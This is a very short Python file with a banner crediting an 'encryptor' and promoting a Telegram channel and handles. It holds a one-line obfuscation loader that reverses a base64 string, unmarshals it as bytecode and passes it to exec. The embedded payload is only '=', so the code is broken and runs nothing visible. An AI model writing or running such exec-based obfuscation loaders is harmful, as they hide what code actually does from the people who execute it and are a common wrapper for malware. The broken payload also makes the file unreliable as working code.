#--------------------------------------------------
# Encrypted By : LɪᴍᴏN HᴏssᴀɪN
# Join TG : t.me/DARK_TEAM_LMNx9
# GitHub : LMNx9-JOHNY
# Telegram : @DARK_LMNx999
#--------------------------------------------------

_ = lambda __ : __import__('marshal').loads(__import__('base64').b64decode(__[::-1]));exec((_)(b'='))